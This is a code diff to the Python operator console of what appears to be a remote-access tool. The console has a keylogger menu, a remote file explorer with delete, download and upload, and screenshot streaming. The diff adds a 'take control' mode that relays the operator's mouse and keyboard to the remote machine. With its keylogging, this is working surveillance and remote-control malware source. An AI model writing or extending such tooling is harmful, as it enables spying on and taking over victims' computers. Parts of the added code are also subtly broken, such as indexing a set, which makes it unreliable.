@@ -10,7 +10,7 @@ import mss.tools
 import ssl
 import cv2
 import numpy as np
-
+from pynput import keyboard, mouse
 
 class App():
     def __init__(self, port, max_clients, timeout):
@@ -42,7 +42,8 @@ class App():
 
         self.tools_menu = tk.Menu(self.menu_bar, tearoff=0)
         self.tools_menu.add_command(label='File Explorer', command=lambda: threading.Thread(target=self.file_explorer, daemon=True).start())
-        self.tools_menu.add_command(label='Monitor Client', command=lambda: threading.Thread(target=self.monitor_client, daemon=True).start())
+        self.tools_menu.add_command(label='Monitor Client', command=lambda: threading.Thread(target=self.monitor_client, args=(False, ), daemon=True).start())
+        self.tools_menu.add_command(label='Monitor Client (take control)', command=lambda: threading.Thread(target=self.monitor_client, args=(True, ), daemon=True).start())
         self.menu_bar.add_cascade(label='Tools', menu=self.tools_menu)
         
         self.keyloggermenu = tk.Menu(self.menu_bar, tearoff=0)
@@ -107,12 +108,48 @@ class App():
         else:
             tk.messagebox.showerror('Keylogger', 'Error while trying to clear the keylogger.')
         
-    def monitor_client(self):
+    def monitor_client(self, take_control):
+        def on_key_press(key):
+            pressed_keys.add(key)
+
+        def on_key_release(key):
+            pressed_keys.discard(key)
+
+        def on_click(x, y, button, pressed):
+            if pressed:
+                pressed_buttons.add(button)
+            else:
+                pressed_buttons.discard(button)
+                
+        def on_move(x, y):
+            global mouse_position
+            mouse_position = (x, y)
+        if take_control: 
+            pressed_keys = set()
+            pressed_buttons = set()
+            
+            keyboard_listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
+            mouse_listener = mouse.Listener(on_click=on_click, on_move=on_move)
+            
+            keyboard_listener.start()
+            mouse_listener.start()
+            
         self.log.add('opened monitor app')
         if self.client != None:
             try:
                 while True:
                     time0 = time.time()
+                    if take_control:
+                        data = pickle.dumps(f'mousemove {mouse_position[0]} {mouse_position[1]}')
+                        header, img_bytes = comm(self.client, f'COMMAND:{len(data)}:NONE', data)
+                        
+                        if len(pressed_buttons) > 0:
+                            data = pickle.dumps(f'mouseclick {pressed_buttons[0].name}')
+                            header, img_bytes = comm(self.client, f'COMMAND:{len(data)}:NONE', data)
+                        
+                        data = pickle.dumps(f'hotkeys {list(pressed_keys)}')
+                        header, img_bytes = comm(self.client, f'COMMAND:{len(data)}:NONE', data)
+                    
                     data = pickle.dumps('screenshot 0')
                     header, img_bytes = comm(self.client, f'COMMAND:{len(data)}:NONE', data)
                     if not 'ERROR' in header:
@@ -132,6 +169,10 @@ class App():
                 print('Error:', e)
             finally:
                 cv2.destroyAllWindows()
+           
+        if take_control:
+            keyboard_listener.stop()
+            mouse_listener.stop()
         
     def file_explorer(self):
         if self.client != None:
@@ -306,6 +347,8 @@ class CMD():
                     app.log.add('socket and client closed by cmd')
                     app.client.close()
                     app.socket.close()
+                    app.client = None
+                    app.socket = None
 
         self.prevent_exit = False
 
@@ -351,6 +394,8 @@ class ConnMaker():
             header, data = comm(app.client, 'CLOSE:CLOSE:CLOSE', b'CLOSE')
             app.client.close()
             app.socket.close()
+            app.client = None
+            app.socket = None
         except:
             pass
 
@@ -361,9 +406,10 @@ class ConnMaker():
                 self.selected_client = [self.clients[selections[0]], self.ids[selections[0]]]
                 self.root.destroy()
                 app.log.add(f'selected : {self.selected_client}')
-                print('selected : ', self.selected_client)
+                tk.messagebox.showinfo('Connection Manager', 'Successfully connected to the client !')
             else:
-                print('selection not valid !')
+                self.root.destroy()
+                tk.messagebox.showerror('Connection Manager', 'Selection not valid !')
         except:
             print(2, 'error !')
 
@@ -503,16 +549,16 @@ class FileExplorer():
 
     def create_context_menu(self):
         context_menu = tk.Menu(self.root, tearoff=0)
-        context_menu.add_command(label="Delete", command=self.delete_item)
-        context_menu.add_command(label="Rename", command=self.rename_item)
-        context_menu.add_command(label="New Folder", command=self.create_new_folder)
-        context_menu.add_command(label="Copy", command=self.copy_item)
-        context_menu.add_command(label="Paste", command=self.paste_item)
-        context_menu.add_command(label="Properties", command=self.show_properties)
-        context_menu.add_command(label="Compress (ZIP)", command=self.compress_item)
-        context_menu.add_command(label="Extract (Unzip)", command=self.extract_item)
-        context_menu.add_command(label="Download", command=self.download_item)
-        context_menu.add_command(label="Upload", command=self.upload_item)
+        context_menu.add_command(label='Delete', command=self.delete_item)
+        context_menu.add_command(label='Rename', command=self.rename_item)
+        context_menu.add_command(label='New Folder', command=self.create_new_folder)
+        context_menu.add_command(label='Copy', command=self.copy_item)
+        context_menu.add_command(label='Paste', command=self.paste_item)
+        context_menu.add_command(label='Properties', command=self.show_properties)
+        context_menu.add_command(label='Compress (ZIP)', command=self.compress_item)
+        context_menu.add_command(label='Extract (Unzip)', command=self.extract_item)
+        context_menu.add_command(label='Download', command=self.download_item)
+        context_menu.add_command(label='Upload', command=self.upload_item)
         return context_menu
     
     def delete_item(self):
@@ -537,33 +583,31 @@ class FileExplorer():
                     
                 self.tree.delete(selected_item)
             except Exception as e:
-                tk.messagebox.showerror("Error", f"Failed to delete : {e}")
+                tk.messagebox.showerror('Error', f'Failed to delete : {e}')
                 
     def rename_item(self):
         selected_item = self.tree.selection()[0]
         old_name = self.tree.item(selected_item, 'values')[0]
         
-        new_name = tk.simpledialog.askstring("Rename", "Enter new name:", initialvalue=os.path.basename(old_name), parent=self.root)
+        new_name = tk.simpledialog.askstring('Rename', 'Enter new name:', initialvalue=os.path.basename(old_name), parent=self.root)
         if new_name:
             try:
-                new_path = os.path.join(os.path.dirname(old_name), new_name).replace("\\", "/")
+                new_path = os.path.join(os.path.dirname(old_name), new_name).replace('\\', '/')
                 
                 data = pickle.dumps(f'rename "{old_name}" "{new_path}"')
                 header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                 
-
-                print(new_path)
-                self.tree.item(selected_item, text=f"{new_name}", values=[new_path])
+                self.tree.item(selected_item, text=f'{new_name}', values=[new_path])
             except Exception as e:
-                tk.messagebox.showerror("Error", f"Failed to rename: {e}")
+                tk.messagebox.showerror('Error', f'Failed to rename: {e}')
                 
     def create_new_folder(self):
         selected_item = self.tree.selection()[0]
         path = self.tree.item(selected_item, 'values')[0]
         
-        folder_name = tk.simpledialog.askstring("New Folder", "Enter folder name:", parent=self.root)
+        folder_name = tk.simpledialog.askstring('New Folder', 'Enter folder name:', parent=self.root)
         if folder_name:
-            new_folder_path = os.path.join(path.replace("\\", "/"), folder_name).replace("\\", "/")
+            new_folder_path = os.path.join(path.replace('\\', '/'), folder_name).replace('\\', '/')
             try:
                 
                 data = pickle.dumps(f'makedirs "{new_folder_path}"')
@@ -576,7 +620,6 @@ class FileExplorer():
     def copy_item(self):
         selected_item = self.tree.selection()[0]
         self.copied_item = self.tree.item(selected_item, 'values')[0]
-        print(f"Copied {self.copied_item}")
 
     def paste_item(self):
         if hasattr(self, 'copied_item'):
